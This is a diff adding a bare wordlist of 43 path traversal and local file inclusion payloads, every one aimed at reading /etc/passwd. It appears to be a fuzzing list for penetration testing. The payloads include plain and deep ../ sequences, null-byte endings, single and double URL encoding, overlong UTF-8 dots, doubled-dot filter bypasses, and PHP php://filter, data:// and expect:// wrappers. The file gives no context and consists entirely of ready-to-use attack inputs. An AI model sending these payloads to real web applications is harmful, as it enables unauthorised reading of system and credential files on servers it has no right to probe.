@@ -1,0 +1,43 @@
+/etc/passwd
+../../../../etc/passwd
+../../../../../../../../etc/passwd
+/etc/passwd%00
+../../../../etc/passwd%00
+../../../../../../../../etc/passwd%00
+%2Fetc%2Fpasswd
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+%252Fetc%252Fpasswd
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
+%c0%ae%c0%ae%c0%ae%c0%ae/etc/passwd
+%c0%ae%c0%ae%c0%ae%c0%ae%c0%ae%c0%ae/etc/passwd
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+..%255c..%255c..%255c..%255cetc%255cpasswd
+..%2F..%5C..%2F..%5C..%2Fetc%2Fpasswd
+..%5C..%2F..%5C..%2F..%5Cetc%5Cpasswd
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=../../../../etc/passwd
+php://filter/convert.base64-encode/resource=../../../../../../../../etc/passwd
+data://text/plain;base64,L2V0Yy9wYXNzd2Q=
+data://text/plain;base64,Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+data://text/plain;base64,Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+expect://ls /etc/passwd
+expect://ls ../../../../etc/passwd
+expect://ls ../../../../../../../../etc/passwd
+....//....//....//....//etc/passwd
+....//....//....//....//....//....//etc/passwd
+....\\....\\....\\....\\etc\\passwd
+....\\....\\....\\....\\....\\....\\etc\\passwd
+....//....\\....//....\\etc/passwd
+....\\....//....\\....//etc\\passwd
+....%2F....%2F....%2F....%2Fetc%2Fpasswd
+....%5C....%5C....%5C....%5Cetc%5Cpasswd
+....%252F....%252F....%252F....%252Fetc%252Fpasswd
+....%255C....%255C....%255C....%255Cetc%255Cpasswd
+....%2F....%5C....%2F....%5Cetc%2Fpasswd
+....%5C....%2F....%5C....%2Fetc%5Cpasswd
+....%2F....%5C....%2F....%5Cetc%2Fpasswd%00
+....%5C....%2F....%5C....%2Fetc%5Cpasswd%00
+....%252F....%252F....%252F....%252Fetc%252Fpasswd%00
+....%255C....%255C....%255C....%255Cetc%255Cpasswd%00
